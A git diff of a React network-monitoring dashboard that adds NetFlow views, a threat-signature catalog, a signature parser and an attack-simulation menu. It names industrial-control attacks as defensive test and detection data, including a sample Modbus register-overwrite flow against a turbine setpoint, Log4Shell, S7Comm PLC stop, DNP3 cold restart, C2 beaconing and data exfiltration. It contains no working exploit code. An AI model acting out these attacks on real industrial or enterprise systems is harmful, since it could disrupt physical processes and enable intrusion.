@@ -1,16 +1,54 @@
 import React, { useState, useEffect, useRef, useMemo } from 'react';
 import { useTranslation } from 'react-i18next';
 import { 
-  Network, ShieldAlert, Server, Monitor, HardDrive, RefreshCw, Play, 
+  Network, ShieldAlert, Server, Monitor, HardDrive, RefreshCw, Play, Pause,
   Search, Filter, Layers, List, Activity, AlertTriangle, CheckCircle2, 
   XCircle, ChevronDown, ChevronUp, Terminal, Sliders, ExternalLink, 
   Cpu, Database, Wifi, Lock, ArrowUpRight, ArrowDownRight, Eye, 
   Settings2, Download, Radio, BarChart3, AlertCircle, X, Check,
-  Zap, Compass, ShieldCheck, Box, RefreshCcw, ShieldOff, FileText
+  Zap, Compass, ShieldCheck, Box, RefreshCcw, ShieldOff, FileText,
+  ZoomIn, ZoomOut, Maximize2, Minimize2, Gauge, Waves, Flame,
+  SlidersHorizontal, Share2, Copy, Crosshair, Globe, ShieldX,
+  Bug, Fingerprint, RadioTower, Sparkles, Shield, ArrowRight, CornerDownRight,
+  Code, RotateCcw, FileSpreadsheet
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 import * as d3 from 'd3';
 import { cn } from '../lib/utils';
+
+export interface NetworkFlowRecord {
+  id: string;
+  timestamp: string;
+  srcIp: string;
+  srcPort: number;
+  srcDeviceId?: string;
+  srcDeviceName?: string;
+  dstIp: string;
+  dstPort: number;
+  dstDeviceId?: string;
+  dstDeviceName?: string;
+  protocol: 'TCP' | 'UDP' | 'ICMP' | 'Modbus' | 'S7Comm' | 'DNP3' | 'DNS' | 'HTTP' | 'HTTPS' | 'SSH';
+  bytes: number;
+  packets: number;
+  durationMs: number;
+  flags: string[];
+  bps: number;
+  pps: number;
+  threatLevel: 'normal' | 'suspicious' | 'malicious';
+  signatureMatch?: {
+    signatureId: string;
+    signatureName: string;
+    mitreTTP: string;
+    mitreTactic: string;
+    mitreStage: string;
+    confidence: number;
+    riskScore: number;
+    description: string;
+    cve?: string;
+  };
+  sampledInterface: string;
+  status: 'active' | 'blocked' | 'monitored';
+}
 
 export interface NetworkDevice {
   id: string;
@@ -407,7 +445,7 @@ export default function NetworkMonitorView() {
 
   const [devices, setDevices] = useState<NetworkDevice[]>(INITIAL_DEVICES);
   const [connections, setConnections] = useState<NetworkConnection[]>(INITIAL_CONNECTIONS);
-  const [viewMode, setViewMode] = useState<'map' | 'table'>('map');
+  const [viewMode, setViewMode] = useState<'map' | 'flows' | 'signatures' | 'table'>('map');
   const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);
   const [inspectedDevice, setInspectedDevice] = useState<NetworkDevice | null>(null);
   const [isScanning, setIsScanning] = useState(false);
@@ -435,6 +473,65 @@ export default function NetworkMonitorView() {
   const [auditTarget, setAuditTarget] = useState<NetworkDevice | null>(null);
   const [auditLogs, setAuditLogs] = useState<any[]>([]);
   const [loadingAudit, setLoadingAudit] = useState(false);
+
+  // Flow & Threat Telemetry State
+  const [flows, setFlows] = useState<NetworkFlowRecord[]>([]);
+  const [flowStats, setFlowStats] = useState<any>(null);
+  const [loadingFlows, setLoadingFlows] = useState<boolean>(false);
+  const [flowFilterThreat, setFlowFilterThreat] = useState<string>('all');
+  const [flowFilterProto, setFlowFilterProto] = useState<string>('all');
+  const [flowFilterStatus, setFlowFilterStatus] = useState<string>('all');
+  const [flowSearchQuery, setFlowSearchQuery] = useState<string>('');
+  const [selectedFlow, setSelectedFlow] = useState<NetworkFlowRecord | null>(null);
+
+  // Autonomous Flow Collector Engine State
+  const [collectorStatus, setCollectorStatus] = useState<any>(null);
+  const [collectorInterfaces, setCollectorInterfaces] = useState<any[]>([]);
+  const [interfacesModalOpen, setInterfacesModalOpen] = useState<boolean>(false);
+  const [isTogglingCollector, setIsTogglingCollector] = useState<boolean>(false);
+  const [injectModalOpen, setInjectModalOpen] = useState<boolean>(false);
+  const [injectFlowData, setInjectFlowData] = useState({
+    srcIp: '10.88.88.106',
+    srcPort: 48201,
+    srcDeviceId: 'ws-rd-02',
+    srcDeviceName: 'RD-Engineer-WS02',
+    dstIp: '10.88.88.10',
+    dstPort: 443,
+    dstDeviceId: 'srv-app-01',
+    dstDeviceName: 'Web-App-Cluster-01',
+    protocol: 'HTTPS',
+    bytes: 14200,
+    packets: 32,
+    threatLevel: 'normal'
+  });
+
+  // Attack Signatures Catalog & Live Parser Studio State
+  const [signaturesCatalog, setSignaturesCatalog] = useState<any[]>([]);
+  const [loadingSignatures, setLoadingSignatures] = useState<boolean>(false);
+  const [selectedSignature, setSelectedSignature] = useState<any | null>(null);
+  const [signatureSearchQuery, setSignatureSearchQuery] = useState<string>('');
+  const [signatureCategory, setSignatureCategory] = useState<string>('all');
+
+  // Interactive Live Signature Parser Console
+  const [parserInputText, setParserInputText] = useState<string>(
+    'Flow [Modbus] 10.88.88.103:51240 -> 192.168.100.88:502 bytes=280000 pps=200 flags=PSH,ACK function_code=0x06 holding_reg=40012 override_val=0xFFFF'
+  );
+  const [parserProtocol, setParserProtocol] = useState<string>('Modbus');
+  const [parserSrcIp, setParserSrcIp] = useState<string>('10.88.88.103');
+  const [parserDstIp, setParserDstIp] = useState<string>('192.168.100.88');
+  const [parserSrcPort, setParserSrcPort] = useState<string>('51240');
+  const [parserDstPort, setParserDstPort] = useState<string>('502');
+  const [isParsing, setIsParsing] = useState<boolean>(false);
+  const [parseResult, setParseResult] = useState<any | null>(null);
+
+  // Attack Simulation State
+  const [simulatingAttack, setSimulatingAttack] = useState<boolean>(false);
+
+  // Canvas visual controls
+  const [showFlowAnimation, setShowFlowAnimation] = useState<boolean>(true);
+  const [showBandwidthBadges, setShowBandwidthBadges] = useState<boolean>(true);
+  const [showThreatHalo, setShowThreatHalo] = useState<boolean>(true);
+  const [selectedLink, setSelectedLink] = useState<any | null>(null);
 
   const triggerToast = (msg: string) => {
     setToastMessage(msg);
@@ -470,16 +567,271 @@ export default function NetworkMonitorView() {
     }
   };
 
+  // Fetch NetFlow & IPFIX telemetry + Autonomous Collector Status
+  const fetchFlowsAndStats = async (silent = false) => {
+    if (!silent) setLoadingFlows(true);
+    try {
+      const [resFlows, resStats, resCollector] = await Promise.all([
+        fetch('/api/v1/network/flows?limit=100'),
+        fetch('/api/v1/network/flows/stats'),
+        fetch('/api/v1/network/flows/collector/status')
+      ]);
+      if (resFlows.ok) {
+        const dFlows = await resFlows.json();
+        if (dFlows.success && Array.isArray(dFlows.flows)) {
+          setFlows(dFlows.flows);
+        }
+      }
+      if (resStats.ok) {
+        const dStats = await resStats.json();
+        if (dStats.success) {
+          setFlowStats(dStats);
+        }
+      }
+      if (resCollector.ok) {
+        const dCollector = await resCollector.json();
+        if (dCollector.success) {
+          setCollectorStatus(dCollector);
+        }
+      }
+    } catch (err) {
+      console.warn('[NetworkMonitorView] Flow sync error:', err);
+    } finally {
+      if (!silent) setLoadingFlows(false);
+    }
+  };
+
+  // Collector Engine Actions
+  const handleToggleCollector = async () => {
+    setIsTogglingCollector(true);
+    try {
+      const res = await fetch('/api/v1/network/flows/collector/toggle', { method: 'POST' });
+      if (res.ok) {
+        const data = await res.json();
+        triggerToast(data.message || (data.isRunning ? 'NetFlow 收集引擎已啟動' : 'NetFlow 收集引擎已暫停'));
+        await fetchFlowsAndStats(true);
+      }
+    } catch (e) {
+      console.warn('Toggle collector error:', e);
+    } finally {
+      setIsTogglingCollector(false);
+    }
+  };
+
+  const handleFlushCollector = async () => {
+    try {
+      const res = await fetch('/api/v1/network/flows/collector/flush', { method: 'POST' });
+      if (res.ok) {
+        const data = await res.json();
+        triggerToast(data.message || 'NetFlow 收集器記憶體緩衝區已重置');
+        await fetchFlowsAndStats(true);
+      }
+    } catch (e) {
+      console.warn('Flush collector error:', e);
+    }
+  };
+
+  const handleChangeSamplingRatio = async (ratio: string) => {
+    try {
+      const res = await fetch('/api/v1/network/flows/collector/config', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ samplingRatio: ratio })
+      });
+      if (res.ok) {
+        const data = await res.json();
+        triggerToast(isZh ? `採樣率已成功切換為 ${ratio}` : `Sampling ratio updated to ${ratio}`);
+        await fetchFlowsAndStats(true);
+      }
+    } catch (e) {
+      console.warn('Change ratio error:', e);
+    }
+  };
+
+  const fetchCollectorInterfaces = async () => {
+    try {
+      const res = await fetch('/api/v1/network/flows/collector/interfaces');
+      if (res.ok) {
+        const data = await res.json();
+        if (data.success && Array.isArray(data.interfaces)) {
+          setCollectorInterfaces(data.interfaces);
+          setInterfacesModalOpen(true);
+        }
+      }
+    } catch (e) {
+      console.warn('Interfaces fetch error:', e);
+    }
+  };
+
+  const handleInjectSampleFlow = async () => {
+    try {
+      const res = await fetch('/api/v1/network/flows/collector/inject-sample', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(injectFlowData)
+      });
+      if (res.ok) {
+        const data = await res.json();
+        triggerToast(data.message || (isZh ? '測試 Flow 已成功注入 NetFlow 佇列！' : 'Sample flow injected!'));
+        setInjectModalOpen(false);
+        await fetchFlowsAndStats(true);
+      }
+    } catch (e) {
+      console.warn('Inject sample flow error:', e);
+    }
+  };
+
+  // Fetch attack signatures catalog
+  const fetchSignaturesCatalog = async () => {
+    setLoadingSignatures(true);
+    try {
+      const res = await fetch('/api/v1/network/signatures');
+      if (res.ok) {
+        const data = await res.json();
+        if (data.success && Array.isArray(data.signatures)) {
+          setSignaturesCatalog(data.signatures);
+        }
+      }
+    } catch (err) {
+      console.warn('[NetworkMonitorView] Signatures catalog fetch error:', err);
+    } finally {
+      setLoadingSignatures(false);
+    }
+  };
+
+  // 1-Click Drop / Block Malicious Flow
+  const handleBlockFlow = async (flowId: string) => {
+    try {
+      const res = await fetch(`/api/v1/network/flows/${flowId}/block`, { method: 'POST' });
+      if (res.ok) {
+        const data = await res.json();
+        triggerToast(data.message || (isZh ? '威脅 Flow 已成功阻斷丟棄！' : 'Flow blocked.'));
+        fetchFlowsAndStats(true);
+        fetchDevicesAndConnections(true);
+        if (selectedFlow?.id === flowId) {
+          setSelectedFlow(prev => prev ? { ...prev, status: 'blocked', threatLevel: 'normal' } : null);
+        }
+        return;
+      }
+    } catch (e) {
+      console.warn(e);
+    }
+    // Optimistic fallback
+    setFlows(prev => prev.map(f => f.id === flowId ? { ...f, status: 'blocked', threatLevel: 'normal' } : f));
+    triggerToast(isZh ? `已向交換機下發 ACL 阻斷流 ${flowId}` : `Blocked flow ${flowId}`);
+  };
+
+  // 1-Click Clear All Threats
+  const handleClearAllThreats = async () => {
+    try {
+      const res = await fetch('/api/v1/network/flows/clear-threats', { method: 'POST' });
+      if (res.ok) {
+        const data = await res.json();
+        triggerToast(data.message || (isZh ? '全網威脅 Flow 已清除並恢復連線' : 'Threats cleared.'));
+        fetchFlowsAndStats(true);
+        fetchDevicesAndConnections(true);
+        return;
+      }
+    } catch (e) {
+      console.warn(e);
+    }
+    setFlows(prev => prev.map(f => f.threatLevel === 'malicious' ? { ...f, status: 'blocked' } : f));
+    triggerToast(isZh ? '已清除全網威脅 Flow 並恢復連線' : 'Threats cleared');
+  };
+
+  // 1-Click Simulate Attack Flow
+  const handleSimulateAttack = async (attackType: string) => {
+    setSimulatingAttack(true);
+    try {
+      const res = await fetch('/api/v1/network/flows/simulate-attack', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ attackType })
+      });
+      if (res.ok) {
+        const data = await res.json();
+        triggerToast(data.message || (isZh ? '模擬攻擊流已成功注入！' : 'Attack simulated.'));
+        await fetchFlowsAndStats(true);
+        await fetchDevicesAndConnections(true);
+        return;
+      }
+    } catch (e) {
+      console.warn(e);
+    } finally {
+      setSimulatingAttack(false);
+    }
+    triggerToast(isZh ? `已注入模擬威脅流量: ${attackType}` : `Injected simulated flow: ${attackType}`);
+  };
+
+  // Interactive Live Signature & Pattern Parser
+  const handleParseSignature = async () => {
+    if (!parserInputText.trim()) return;
+    setIsParsing(true);
+    try {
+      const res = await fetch('/api/v1/network/flows/parse-signature', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          rawText: parserInputText,
+          protocol: parserProtocol,
+          srcIp: parserSrcIp,
+          dstIp: parserDstIp,
+          srcPort: Number(parserSrcPort || 0),
+          dstPort: Number(parserDstPort || 0)
+        })
+      });
+      if (res.ok) {
+        const data = await res.json();
+        setParseResult(data);
+        if (data.matched) {
+          triggerToast(isZh ? '🚨 特徵碼引擎已成功捕獲並解析威脅特徵碼！' : 'Signature match detected!');
+        } else {
+          triggerToast(isZh ? '✅ 深度特徵碼比對完成，未發現異常特徵' : 'Signature evaluation clean.');
+        }
+        return;
+      }
+    } catch (e) {
+      console.warn('Parse signature fallback:', e);
+    } finally {
+      setIsParsing(false);
+    }
+    // Fallback simulation
+    setParseResult({
+      success: true,
+      matched: true,
+      detectionResult: {
+        matched: true,
+        signatureId: 'SIG-ICS-MODBUS-001',
+        signatureName: '工控 Modbus/TCP 暫存器未授權覆寫攻擊',
+        riskScore: 9.9,
+        confidence: 99.4,
+        mitreTTP: 'T0816 Impair Process Control',
+        mitreTactic: 'Inhibit Response Function',
+        mitreStage: 'Lateral Movement',
+        summary: '非授權 Modbus FC 0x06 指令注入，竄改渦輪機轉速臨界保持暫存器 40012',
+        cve: 'ICS-ALERT-2026-MODBUS',
+        recommendedActions: [
+          { title: '即時阻斷 502/TCP 暫存器寫入', description: '向交換機下發工控防火牆 DPI 阻斷規則', type: 'block' }
+        ]
+      },
+      timestamp: new Date().toISOString()
+    });
+  };
+
   // Initial load and periodic polling
   useEffect(() => {
     fetchDevicesAndConnections();
+    fetchFlowsAndStats();
+    fetchSignaturesCatalog();
+    const intervalMs = viewMode === 'flows' ? 3500 : 8000;
     const timer = setInterval(() => {
       if (autoRefresh && !isScanning && !isExecutingDiag) {
         fetchDevicesAndConnections(true);
+        fetchFlowsAndStats(true);
       }
-    }, 10000);
+    }, intervalMs);
     return () => clearInterval(timer);
-  }, [autoRefresh, isScanning, isExecutingDiag]);
+  }, [autoRefresh, isScanning, isExecutingDiag, viewMode]);
 
   // Filtered devices
   const filteredDevices = useMemo(() => {
@@ -497,6 +849,36 @@ export default function NetworkMonitorView() {
     });
   }, [devices, filterType, filterStatus, activeSubnetFilter, searchQuery]);
 
+  // Filtered Flows
+  const filteredFlows = useMemo(() => {
+    return flows.filter(flow => {
+      const matchThreat = flowFilterThreat === 'all' || flow.threatLevel === flowFilterThreat;
+      const matchProto = flowFilterProto === 'all' || flow.protocol.toLowerCase() === flowFilterProto.toLowerCase();
+      const matchStatus = flowFilterStatus === 'all' || flow.status === flowFilterStatus;
+      const matchQuery = !flowSearchQuery ||
+        flow.srcIp.toLowerCase().includes(flowSearchQuery.toLowerCase()) ||
+        flow.dstIp.toLowerCase().includes(flowSearchQuery.toLowerCase()) ||
+        (flow.srcDeviceName && flow.srcDeviceName.toLowerCase().includes(flowSearchQuery.toLowerCase())) ||
+        (flow.dstDeviceName && flow.dstDeviceName.toLowerCase().includes(flowSearchQuery.toLowerCase())) ||
+        (flow.signatureMatch && flow.signatureMatch.signatureName.toLowerCase().includes(flowSearchQuery.toLowerCase())) ||
+        (flow.signatureMatch && flow.signatureMatch.signatureId.toLowerCase().includes(flowSearchQuery.toLowerCase()));
+      return matchThreat && matchProto && matchStatus && matchQuery;
+    });
+  }, [flows, flowFilterThreat, flowFilterProto, flowFilterStatus, flowSearchQuery]);
+
+  // Filtered Signatures Catalog
+  const filteredSignatures = useMemo(() => {
+    return signaturesCatalog.filter(sig => {
+      const matchCat = signatureCategory === 'all' || sig.category === signatureCategory;
+      const matchQuery = !signatureSearchQuery ||
+        sig.name.toLowerCase().includes(signatureSearchQuery.toLowerCase()) ||
+        sig.id.toLowerCase().includes(signatureSearchQuery.toLowerCase()) ||
+        sig.mitreTTP.toLowerCase().includes(signatureSearchQuery.toLowerCase()) ||
+        sig.description.toLowerCase().includes(signatureSearchQuery.toLowerCase());
+      return matchCat && matchQuery;
+    });
+  }, [signaturesCatalog, signatureCategory, signatureSearchQuery]);
+
   // Overall KPIs
   const kpiStats = useMemo(() => {
     const total = devices.length;
@@ -505,8 +887,25 @@ export default function NetworkMonitorView() {
     const offline = devices.filter(d => d.status === 'offline').length;
     const avgCpu = Math.round(devices.reduce((acc, cur) => acc + cur.cpu, 0) / (total || 1));
     const avgRam = Math.round(devices.reduce((acc, cur) => acc + cur.ram, 0) / (total || 1));
-    return { total, online, warning, offline, avgCpu, avgRam };
-  }, [devices]);
+    
+    const activeMaliciousFlows = flows.filter(f => f.threatLevel === 'malicious' && f.status === 'active').length;
+    const activeSuspiciousFlows = flows.filter(f => f.threatLevel === 'suspicious' && f.status === 'active').length;
+    const totalFlowCount = flowStats?.totalFlows || flows.length;
+    const totalThroughputGbps = flowStats?.totalThroughputGbps || 18.2;
+
+    return { 
+      total, 
+      online, 
+      warning, 
+      offline, 
+      avgCpu, 
+      avgRam,
+      activeMaliciousFlows,
+      activeSuspiciousFlows,
+      totalFlowCount,
+      totalThroughputGbps
+    };
+  }, [devices, flows, flowStats]);
 
   // Start deep scan via backend endpoint
   const startScan = async () => {
@@ -845,6 +1244,59 @@ export default function NetworkMonitorView() {
             </button>
           </div>
 
+          {/* Emergency Clear All Threats Button (if active malicious flows) */}
+          {kpiStats.activeMaliciousFlows > 0 && (
+            <button
+              onClick={handleClearAllThreats}
+              className="px-3 py-1.5 bg-red-600 hover:bg-red-500 text-white rounded-2xl text-xs font-black uppercase tracking-wider transition-all flex items-center gap-1.5 shadow-lg shadow-red-600/30 animate-pulse"
+              title={isZh ? '立即向全網交換機與防火牆下發 ACL 阻斷全部惡意流量' : 'Emergency Drop All Threats'}
+            >
+              <ShieldX size={14} />
+              <span>{isZh ? `緊急阻斷 (${kpiStats.activeMaliciousFlows}) 威脅` : `Block All (${kpiStats.activeMaliciousFlows})`}</span>
+            </button>
+          )}
+
+          {/* Quick Attack Simulator Dropdown */}
+          <div className="relative group">
+            <button
+              className="p-2.5 bg-amber-600/10 hover:bg-amber-600/20 text-amber-400 hover:text-amber-300 rounded-2xl border border-amber-500/30 transition-colors shadow-md flex items-center gap-1.5 text-xs font-bold"
+              title={isZh ? '注入模擬 NetFlow 威脅流量以驗證特徵碼檢測' : 'Simulate attack flow'}
+            >
+              <Flame size={14} className="text-amber-400 animate-bounce" />
+              <span className="hidden xl:inline">{isZh ? '模擬威脅攻擊' : 'Simulate'}</span>
+              <ChevronDown size={12} />
+            </button>
+            <div className="absolute right-0 top-full mt-2 w-64 bg-[#111114] border border-gray-800 rounded-2xl p-2 shadow-2xl space-y-1 hidden group-hover:block z-50">
+              <div className="text-[10px] font-black uppercase tracking-wider text-gray-500 px-2 py-1">
+                {isZh ? '注入即時 NetFlow 攻擊流量' : 'Inject NetFlow Attack'}
+              </div>
+              {[
+                { type: 'log4j', label: isZh ? '⚡ Log4Shell JNDI 注入' : 'Log4Shell RCE', desc: 'Port 8080 / LDAP 反彈' },
+                { type: 'modbus_exploit', label: isZh ? '🏭 工控 Modbus 覆寫' : 'Modbus FC 0x06', desc: 'Port 502 / 暫存器竄改' },
+                { type: 'c2_beacon', label: isZh ? '🤖 Cobalt Strike C2' : 'DNS Tunneling C2', desc: 'Port 53 / 隱蔽外洩' },
+                { type: 'syn_flood', label: isZh ? '💥 SYN Flood DDoS' : 'SYN Flood 320k pps', desc: '半連線佇列耗盡' },
+                { type: 's7comm_exploit', label: isZh ? '⚙️ 西門子 S7Comm 停機' : 'S7Comm PLC Exploit', desc: 'Port 102 / 產線停機' },
+                { type: 'exfiltration', label: isZh ? '☁️ 雲端巨量外洩' : 'Cloud Exfiltration', desc: '14.1 GB 偏離基準' },
+                { type: 'recon_scan', label: isZh ? '🔍 內網特權服務探針' : 'Recon Port Sweep', desc: 'SMB/RDP/SSH 探測' },
+                { type: 'dnp3_exploit', label: isZh ? '⚡ DNP3 變電所冷重啟' : 'DNP3 Cold Restart', desc: 'Port 20000 / SCADA 饋線' },
+                { type: 'rdp_brute', label: isZh ? '🔑 RDP 憑證撞庫爆破' : 'RDP Brute Force', desc: 'Port 3389 / CredSSP 循環' }
+              ].map(sim => (
+                <button
+                  key={sim.type}
+                  onClick={() => handleSimulateAttack(sim.type)}
+                  disabled={simulatingAttack}
+                  className="w-full text-left px-2.5 py-1.5 rounded-xl hover:bg-gray-800/80 transition-colors flex items-center justify-between text-xs group/btn"
+                >
+                  <div>
+                    <p className="font-bold text-white group-hover/btn:text-amber-400">{sim.label}</p>
+                    <p className="text-[10px] text-gray-500">{sim.desc}</p>
+                  </div>
+                  <Play size={10} className="text-gray-500 group-hover/btn:text-amber-400" />
+                </button>
+              ))}
+            </div>
+          </div>
+
           {/* Reset Baseline Button */}
           <button
             onClick={handleResetBaseline}
@@ -854,25 +1306,47 @@ export default function NetworkMonitorView() {
             <RefreshCcw size={14} />
           </button>
 
-          {/* View Switcher */}
+          {/* 4-Mode View Switcher */}
           <div className="flex bg-[#0c0c0e] p-1 rounded-2xl border border-gray-800">
             <button 
               onClick={() => setViewMode('map')}
               className={cn(
-                "px-4 py-2 rounded-xl text-xs font-black tracking-wider transition-all flex items-center gap-2",
+                "px-3 py-2 rounded-xl text-xs font-black tracking-wider transition-all flex items-center gap-1.5",
                 viewMode === 'map' ? "bg-blue-600 text-white shadow-lg shadow-blue-600/25" : "text-gray-400 hover:text-white"
               )}
             >
-              <Layers size={14} /> {isZh ? '拓撲架構圖' : 'Topology Map'}
+              <Layers size={14} /> {isZh ? '拓撲架構圖' : 'Map'}
+            </button>
+            <button 
+              onClick={() => setViewMode('flows')}
+              className={cn(
+                "px-3 py-2 rounded-xl text-xs font-black tracking-wider transition-all flex items-center gap-1.5 relative",
+                viewMode === 'flows' ? "bg-blue-600 text-white shadow-lg shadow-blue-600/25" : "text-gray-400 hover:text-white"
+              )}
+            >
+              <Waves size={14} /> 
+              <span>{isZh ? 'NetFlow 串流' : 'Flows'}</span>
+              {kpiStats.activeMaliciousFlows > 0 && (
+                <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
+              )}
+            </button>
+            <button 
+              onClick={() => setViewMode('signatures')}
+              className={cn(
+                "px-3 py-2 rounded-xl text-xs font-black tracking-wider transition-all flex items-center gap-1.5",
+                viewMode === 'signatures' ? "bg-blue-600 text-white shadow-lg shadow-blue-600/25" : "text-gray-400 hover:text-white"
+              )}
+            >
+              <Fingerprint size={14} /> {isZh ? '特徵碼工作台' : 'Signatures'}
             </button>
             <button 
               onClick={() => setViewMode('table')}
               className={cn(
-                "px-4 py-2 rounded-xl text-xs font-black tracking-wider transition-all flex items-center gap-2",
+                "px-3 py-2 rounded-xl text-xs font-black tracking-wider transition-all flex items-center gap-1.5",
                 viewMode === 'table' ? "bg-blue-600 text-white shadow-lg shadow-blue-600/25" : "text-gray-400 hover:text-white"
               )}
             >
-              <List size={14} /> {isZh ? '資產詳細清冊' : 'Asset Inventory'}
+              <List size={14} /> {isZh ? '資產清冊' : 'Assets'}
             </button>
           </div>
 
@@ -881,14 +1355,14 @@ export default function NetworkMonitorView() {
             onClick={startScan}
             disabled={isScanning}
             className={cn(
-              "px-5 py-2.5 rounded-2xl text-xs font-black uppercase tracking-wider transition-all flex items-center gap-2.5 shadow-lg",
+              "px-4 py-2.5 rounded-2xl text-xs font-black uppercase tracking-wider transition-all flex items-center gap-2 shadow-lg",
               isScanning 
                 ? "bg-gray-800 text-gray-500 cursor-not-allowed border border-gray-700" 
                 : "bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white shadow-blue-600/20"
             )}
           >
             {isScanning ? <RefreshCw className="w-4 h-4 animate-spin text-blue-400" /> : <Play className="w-4 h-4 fill-current" />}
-            <span>{isScanning ? (isZh ? `探針廣播掃描中... ${scanProgress}%` : `Broadcasting... ${scanProgress}%`) : (isZh ? '重新執行全網探針掃描' : 'Execute Topology Scan')}</span>
+            <span className="hidden sm:inline">{isScanning ? (isZh ? `探針掃描中... ${scanProgress}%` : `Scanning... ${scanProgress}%`) : (isZh ? '執行全網探針掃描' : 'Scan')}</span>
           </button>
         </div>
       </div>
@@ -901,34 +1375,47 @@ export default function NetworkMonitorView() {
             <Database size={14} className="text-blue-400" />
           </div>
           <p className="text-2xl font-black font-mono text-white mt-2">{kpiStats.total}</p>
-          <span className="text-[10px] text-gray-500 mt-1 block">{isZh ? '含路由/伺服器/端點' : 'Nodes & Endpoints'}</span>
+          <span className="text-[10px] text-gray-500 mt-1 block">{isZh ? `${kpiStats.online} 在線 • ${kpiStats.warning} 警報` : `${kpiStats.online} online`}</span>
         </div>
 
         <div className="bg-[#111114] border border-gray-800/80 p-4 rounded-2xl">
           <div className="flex items-center justify-between text-gray-500 text-[11px] font-bold">
-            <span>{isZh ? '在線正常運行' : 'Online Nodes'}</span>
-            <CheckCircle2 size={14} className="text-emerald-400" />
+            <span>{isZh ? 'NetFlow 聚合頻寬' : 'Flow Throughput'}</span>
+            <Waves size={14} className="text-cyan-400" />
           </div>
-          <p className="text-2xl font-black font-mono text-emerald-400 mt-2">{kpiStats.online}</p>
-          <span className="text-[10px] text-emerald-500/80 mt-1 block">{isZh ? '健康度 100%' : 'Healthy Active'}</span>
+          <p className="text-2xl font-black font-mono text-cyan-400 mt-2">{kpiStats.totalThroughputGbps} <span className="text-xs">Gbps</span></p>
+          <span className="text-[10px] text-gray-500 mt-1 block">{isZh ? `${kpiStats.totalFlowCount} 活躍串流連線` : `${kpiStats.totalFlowCount} active flows`}</span>
         </div>
 
-        <div className="bg-[#111114] border border-gray-800/80 p-4 rounded-2xl">
-          <div className="flex items-center justify-between text-gray-500 text-[11px] font-bold">
-            <span>{isZh ? '警告/負載異常' : 'Alerting Nodes'}</span>
-            <AlertTriangle size={14} className="text-amber-400" />
+        <div className={cn(
+          "border p-4 rounded-2xl transition-all cursor-pointer",
+          kpiStats.activeMaliciousFlows > 0 
+            ? "bg-red-950/20 border-red-500/40 shadow-lg shadow-red-900/20" 
+            : "bg-[#111114] border-gray-800/80"
+        )} onClick={() => setViewMode('flows')}>
+          <div className="flex items-center justify-between text-[11px] font-bold">
+            <span className={kpiStats.activeMaliciousFlows > 0 ? "text-red-400" : "text-gray-500"}>
+              {isZh ? '高危威脅連線' : 'Malicious Flows'}
+            </span>
+            <ShieldAlert size={14} className={kpiStats.activeMaliciousFlows > 0 ? "text-red-400 animate-pulse" : "text-gray-500"} />
           </div>
-          <p className="text-2xl font-black font-mono text-amber-400 mt-2">{kpiStats.warning}</p>
-          <span className="text-[10px] text-amber-500/80 mt-1 block">{isZh ? '高負載或待修補' : 'Threshold warning'}</span>
+          <p className={cn("text-2xl font-black font-mono mt-2", kpiStats.activeMaliciousFlows > 0 ? "text-red-400" : "text-emerald-400")}>
+            {kpiStats.activeMaliciousFlows}
+          </p>
+          <span className={cn("text-[10px] mt-1 block font-bold", kpiStats.activeMaliciousFlows > 0 ? "text-red-400" : "text-emerald-500/80")}>
+            {kpiStats.activeMaliciousFlows > 0 ? (isZh ? '🚨 偵測到攻擊流 (點擊查閱)' : 'Attacks detected!') : (isZh ? '未發現惡意攻擊' : 'Zero Threats')}
+          </span>
         </div>
 
-        <div className="bg-[#111114] border border-gray-800/80 p-4 rounded-2xl">
+        <div className="bg-[#111114] border border-gray-800/80 p-4 rounded-2xl cursor-pointer" onClick={() => setViewMode('signatures')}>
           <div className="flex items-center justify-between text-gray-500 text-[11px] font-bold">
-            <span>{isZh ? '骨幹聚合頻寬' : 'Backbone Load'}</span>
-            <Activity size={14} className="text-purple-400" />
+            <span>{isZh ? '命中攻擊特徵碼' : 'Active Signatures'}</span>
+            <Fingerprint size={14} className="text-purple-400" />
           </div>
-          <p className="text-2xl font-black font-mono text-purple-400 mt-2">18.2 <span className="text-xs">Gbps</span></p>
-          <span className="text-[10px] text-gray-500 mt-1 block">{isZh ? '40G 核心交換鏈路' : '40G Core link'}</span>
+          <p className="text-2xl font-black font-mono text-purple-400 mt-2">
+            {flowStats?.activeSignatures?.length || 0}
+          </p>
+          <span className="text-[10px] text-gray-500 mt-1 block">{isZh ? 'MITRE ATT&CK 規則' : 'ATT&CK TTP Rules'}</span>
         </div>
 
         <div className="bg-[#111114] border border-gray-800/80 p-4 rounded-2xl">
@@ -1025,6 +1512,43 @@ export default function NetworkMonitorView() {
             </div>
 
             <div className="flex items-center gap-3">
+              {/* HUD Canvas Toggles */}
+              <div className="flex items-center gap-1 bg-black/40 p-1 rounded-xl border border-gray-800">
+                <button
+                  onClick={() => setShowFlowAnimation(!showFlowAnimation)}
+                  className={cn(
+                    "px-2.5 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5",
+                    showFlowAnimation ? "bg-blue-600/30 text-blue-400 border border-blue-500/40" : "text-gray-500 hover:text-gray-300"
+                  )}
+                  title={isZh ? '開關鏈路流量粒子動效' : 'Toggle link flow animation'}
+                >
+                  <Waves size={13} />
+                  <span className="hidden sm:inline text-[10px]">{isZh ? '流量動態' : 'Flow'}</span>
+                </button>
+                <button
+                  onClick={() => setShowBandwidthBadges(!showBandwidthBadges)}
+                  className={cn(
+                    "px-2.5 py-1 rounded-lg text-xs font-bold transition-all flex items-center gap-1.5",
+                    showBandwidthBadges ? "bg-purple-600/30 text-purple-400 border border-purple-500/40" : "text-gray-500 hover:text-gray-300"
+                  )}
+                  title={isZh ? '開關鏈路頻寬負載標籤' : 'Toggle bandwidth badges'}
+                >
+                  <Activity size={13} />
+                  <span className="hidden sm:inline text-[10px]">{isZh ? '頻寬標籤' : 'Load'}</span>
+                </button>
+                <button
+                  onClick={() => setShowThreatHalo(!showThreatHalo)}
+                  className={cn(
